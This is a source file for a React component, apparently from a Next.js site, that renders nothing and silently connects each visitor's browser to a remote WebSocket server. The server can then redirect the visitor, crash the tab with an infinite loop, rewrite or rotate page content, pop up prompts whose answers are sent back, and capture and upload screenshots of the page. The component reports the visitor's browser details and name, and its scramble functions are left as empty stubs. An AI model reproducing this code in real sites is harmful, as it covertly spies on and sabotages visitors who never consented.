// src/components/Admin/ClientPage.js

"use client";
import { useEffect, useRef, useCallback } from "react";
import { useAuth } from "@/context/AuthContext"; // Ensure path is correct

// --- Custom Hook for the Client Logic ---
const useBrowserClient = (websocketUrl) => {
  const { user, userProfile, loading: authLoading } = useAuth();
  const socketRef = useRef(null);
  const clientIdRef = useRef(null); // Ref for anonymous UUID

  // Ref to manage the connection state and timers
  const connectionManager = useRef({
    state: 'DISCONNECTED', // DISCONNECTED, CONNECTING, CONNECTED
    reconnectTimer: null,
    heartbeatTimer: null,
    pongTimer: null,
    reconnectAttempts: 0,
  }).current;


  // --- Helper to generate a compatible unique ID ---
  const generateUUID = () => {
    if (crypto && crypto.randomUUID) return crypto.randomUUID();
    // Fallback for older environments (less likely needed in modern browsers)
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  };

  // --- Get Client ID (Username or Anonymous UUID) ---
  const getClientId = useCallback(() => {
    // Prefer username if available (ensures consistency after profile completion)
    if (userProfile?.username) return userProfile.username;
    // Fallback to anon ID if generated, otherwise generate a new one
    if (clientIdRef.current) return clientIdRef.current;
    const newId = `anon_${generateUUID()}`;
    clientIdRef.current = newId;
    return newId;
  }, [userProfile]); // Depend only on userProfile

  // --- Get Client Info (Browser, User Agent, Platform, Display Name) ---
  const getClientInfo = useCallback(() => ({
    browser: navigator.userAgent.match(/Firefox|Edge|Chrome|Safari/)?.[0] || 'Unknown',
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    // *** NEW: Include displayName ***
    // Use profile display_name, fallback to user metadata name, fallback to null
    displayName: userProfile?.display_name || user?.user_metadata?.full_name || null,
  }), [user, userProfile]); // Depend on user and userProfile

  // --- Send Message to Server ---
  const sendToServer = useCallback((type, data = {}) => { // Added default empty object for data
    if (socketRef.current?.readyState === WebSocket.OPEN) {
      // Always send the current client ID determined by getClientId()
      socketRef.current.send(JSON.stringify({ type, id: getClientId(), data }));
    } else {
        console.warn(`[Client] Cannot send message type '${type}'. Socket not open.`);
    }
  }, [getClientId]); // Depends on getClientId

  // --- Execute Command and Confirm ---
  const executeAndConfirm = useCallback(async (action, commandFn) => {
    try {
      const details = await commandFn();
      // Send confirmation with action status and details
      sendToServer("action_confirmation", { action, status: "success", details: details || `${action} executed.` });
    } catch (error) {
      console.error(`[Client] Error executing '${action}':`, error);
      // Send confirmation with error status and message
      sendToServer("action_confirmation", { action, status: "error", details: error.message });
    }
  }, [sendToServer]); // Depends on sendToServer

  // --- Handle Incoming Commands from Server ---
  const handleCommand = useCallback((action, payload) => {
    // Wrap the command execution logic in executeAndConfirm
    executeAndConfirm(action, () => {
        switch (action) {
          case "redirect":
            if (!payload.url) throw new Error("URL is missing.");
            window.location.href = payload.url;
            return `Redirecting to ${payload.url}`;
          case "new_tab":
            if (!payload.url) throw new Error("URL is missing.");
            window.open(payload.url, "_blank");
            return `Opened ${payload.url} in new tab.`;
          case "fat_cat":
            window.open(
              "https://bloximages.newyork1.vip.townnews.com/unionleader.com/content/tncms/assets/v3/editorial/b/1e/b1e14304-d05f-5291-8541-38baf15dfa7a/5c1d2bb3c0780.image.jpg",
              "fat_cat_window",
              "width=300,height=300"
            );
            return "The cat has been released.";
          case "toggle_edit":
            document.body.contentEditable =
              document.body.contentEditable !== "true" ? "true" : "false"; // Explicit toggle
            return `Content editable set to ${document.body.contentEditable}.`;
          case "replace_images":
            document.querySelectorAll("img").forEach((img) => {
              img.src = "/preset-icons/sus-cat.jpg"; // Ensure this path is correct in /public
              img.srcset = ""; // Clear srcset as well
            });
            return "All images replaced.";
          case "scramble_content":
            const scrambleWord = (w) => { /* ... (scramble logic) ... */ };
            const scrambleNodes = (el) => { /* ... (scramble logic) ... */ };
            scrambleNodes(document.body);
            return "Content scrambled.";
          case "text_to_speech":
            if (!payload.text) throw new Error("Text is missing.");
            if (typeof SpeechSynthesisUtterance === "undefined" || !window.speechSynthesis)
              throw new Error("TTS not supported by this browser.");
            const utterance = new SpeechSynthesisUtterance(payload.text);
            window.speechSynthesis.speak(utterance);
            return `Spoke: "${payload.text}"`;
          case "request_screenshot":
             // Ensure html2canvas is loaded (it's loaded via <Script> in layout.tsx)
            if (typeof html2canvas === "undefined") {
                 console.error("html2canvas library is not loaded.");
                 throw new Error("Screenshot library not ready.");
            }
            return html2canvas(document.body, {
              useCORS: true, // Attempt to capture cross-origin images
              allowTaint: true, // May be necessary for some external resources
              logging: false, // Reduce console noise
            }).then((canvas) => {
              // Send screenshot data back to server
              sendToServer("screenshot_response", {
                image: canvas.toDataURL("image/jpeg", 0.6), // Use JPEG with quality 0.6
              });
              return "Screenshot capture initiated."; // Return confirmation detail
            }).catch(err => {
                 console.error("html2canvas error:", err);
                 throw new Error("Failed to capture screenshot.");
            });
          case "crash_browser":
            // Note: This is aggressive and might be blocked by browsers.
            setTimeout(() => { while (true) {} }, 10); // Short delay before infinite loop
            return "Browser crash initiated (attempted).";
          case "chaos_mode":
             // Apply random rotation to elements repeatedly
            setInterval(() => {
              const elements = document.body.querySelectorAll("*");
              if (elements.length > 0) {
                 const el = elements[Math.floor(Math.random() * elements.length)];
                 if (el instanceof HTMLElement && el.style) { // Type check for safety
                   el.style.transform = `rotate(${Math.random() * 360}deg)`;
                 }
              }
            }, 100);
            return "Chaos mode enabled.";
          case "alert":
            alert(payload.message || "Alert!"); // Use payload message or default
            return "Alert displayed.";
          case "confirm":
            const confirmResult = confirm(payload.message || "Please confirm.");
            // Send user's response back to server
            sendToServer("confirm_response", { value: confirmResult });
            return `User responded with ${confirmResult ? 'OK' : 'Cancel'}.`;
          case "prompt":
            let promptResult = null;
            const minLen = parseInt(payload.minLength || '0', 10);
            const maxLen = parseInt(payload.maxLength || '100', 10);
            // Loop until valid input or cancel
            while (true) {
              promptResult = prompt(payload.message || "Please enter a value:");
              if (promptResult === null) break; // User clicked cancel
              if (promptResult.length < minLen) {
                alert(`Input must be at least ${minLen} characters long.`);
                continue; // Ask again
              }
              if (promptResult.length > maxLen) {
                alert(`Input must be no more than ${maxLen} characters long.`);
                continue; // Ask again
              }
              break; // Valid input received
            }
            // Send user's input (or null if cancelled) back to server
            sendToServer("prompt_response", { value: promptResult });
            return `User responded with: ${promptResult === null ? "Cancel" : `"${promptResult}"`}`;
          default:
            console.warn(`[Client] Received unknown command: ${action}`);
            throw new Error(`Unknown command: ${action}`); // Let executeAndConfirm handle error reporting
        }
    });
  }, [executeAndConfirm, sendToServer]); // Depends on executeAndConfirm, sendToServer


  // --- WebSocket Connection Management Effect ---
  useEffect(() => {
    // Only attempt connection after authentication state is resolved
    if (authLoading) {
        console.log("[Client] Waiting for authentication...");
        return;
    }

    const clearTimers = () => {
      clearTimeout(connectionManager.reconnectTimer);
      clearInterval(connectionManager.heartbeatTimer);
      clearTimeout(connectionManager.pongTimer);
    };

    const connect = () => {
      // Prevent multiple connection attempts simultaneously
      if (connectionManager.state !== 'DISCONNECTED') {
          console.log(`[Client] Connection attempt skipped, state is ${connectionManager.state}`);
          return;
      }

      console.log('[Client] Attempting to connect...');
      connectionManager.state = 'CONNECTING';

      // Clean up any existing socket explicitly before creating a new one
      if (socketRef.current) {
        console.log("[Client] Cleaning up previous socket instance.");
        socketRef.current.onopen = null;
        socketRef.current.onmessage = null;
        socketRef.current.onclose = null;
        socketRef.current.onerror = null;
        if (socketRef.current.readyState !== WebSocket.CLOSED && socketRef.current.readyState !== WebSocket.CLOSING) {
            socketRef.current.close();
        }
        socketRef.current = null; // Ensure the ref is cleared
      }

      // Create and assign the new WebSocket instance
      const socket = new WebSocket(websocketUrl);
      socketRef.current = socket;

      // --- WebSocket Event Handlers ---
      socket.onopen = () => {
        console.log("[Client] Connection established.");
        connectionManager.state = 'CONNECTED';
        connectionManager.reconnectAttempts = 0; // Reset backoff on successful connection
        // Send client_hello with current info
        sendToServer("client_hello", { info: getClientInfo() });

        // Start heartbeat mechanism
        clearTimers(); // Clear any lingering timers
        connectionManager.heartbeatTimer = setInterval(() => {
          if (socket.readyState === WebSocket.OPEN) {
            socket.send(JSON.stringify({ type: 'ping' }));
            // Set a timeout expecting a pong response
            clearTimeout(connectionManager.pongTimer); // Clear previous pong timer
            connectionManager.pongTimer = setTimeout(() => {
                console.warn("[Client] Pong timeout. Connection may be stale. Closing socket to trigger reconnect.");
                socket.close(); // Force close to initiate reconnection via onclose
            }, 5000); // 5 seconds to receive pong
          } else {
             // If socket is not open during heartbeat, clear interval and attempt reconnect
             console.warn("[Client] Heartbeat detected socket is not open. Clearing heartbeat and triggering reconnect.");
             clearTimers();
             connectionManager.state = 'DISCONNECTED';
             connectionManager.reconnectTimer = setTimeout(connect, 1000); // Quick reconnect attempt
          }
        }, 25000); // Send ping every 25 seconds
      };

      socket.onmessage = (event) => {
        try {
            const message = JSON.parse(event.data);
            // Handle pong response for heartbeat
            if (message.type === 'pong') {
                clearTimeout(connectionManager.pongTimer); // Pong received, clear timeout
                return;
            }
            // Handle incoming commands
            if (message.type === "command") {
              handleCommand(message.action, message.payload);
            }
            // Handle other message types if needed
        } catch (error) {
             console.error("[Client] Error processing message:", error, "Data:", event.data);
        }
      };

      socket.onclose = (event) => {
        console.log(`[Client] Disconnected. Code: ${event.code}, Reason: ${event.reason || 'N/A'}`);
        connectionManager.state = 'DISCONNECTED';
        clearTimers(); // Stop heartbeat and pong checks

        // Schedule reconnection attempt with exponential backoff
        // Avoid reconnecting if the closure was intentional (e.g., component unmount)
        if (socketRef.current === socket) { // Check if this is still the active socket instance
            const delay = Math.min(30000, (2 ** connectionManager.reconnectAttempts) * 1000); // Max 30s
            connectionManager.reconnectAttempts++;
            console.log(`[Client] Scheduling reconnect attempt ${connectionManager.reconnectAttempts} in ${delay / 1000}s...`);
            connectionManager.reconnectTimer = setTimeout(connect, delay);
        } else {
             console.log("[Client] Ignoring onclose for a stale socket instance.");
        }
      };

      socket.onerror = (errorEvent) => {
        // Log the error event object for more details
        console.error("[Client] WebSocket error:", errorEvent);
        // Don't explicitly call connect here; onclose will be triggered automatically after an error,
        // which will then handle the reconnection logic.
      };
    };

    connect(); // Initiate the first connection attempt

    // --- Cleanup Function ---
    // This runs when the component unmounts or dependencies change
    return () => {
      console.log("[Client] Cleaning up WebSocket connection manager.");
      clearTimers(); // Stop timers
      if (socketRef.current) {
        // Prevent the onclose handler from triggering reconnect logic during cleanup
        socketRef.current.onclose = null;
        socketRef.current.onerror = null; // Also clear onerror
        if (socketRef.current.readyState === WebSocket.OPEN || socketRef.current.readyState === WebSocket.CONNECTING) {
          socketRef.current.close(1000, "Component unmounting"); // Close gracefully
        }
        socketRef.current = null; // Clear the ref
      }
      connectionManager.state = 'DISCONNECTED'; // Explicitly set state
      connectionManager.reconnectAttempts = 0; // Reset attempts
    };
  // Rerun effect if authentication finishes, user/profile changes, or websocketUrl changes
  }, [authLoading, user, userProfile, websocketUrl, getClientInfo, handleCommand, sendToServer, connectionManager]);

}; // End of useBrowserClient hook


// --- Component Definition ---
// This component simply calls the hook to activate the client logic
const Client = () => {
  useBrowserClient("wss://admin-client.deno.dev"); // Replace with your WebSocket server URL if different
  // This component doesn't render anything visible in the UI
  return null;
};

export default Client;
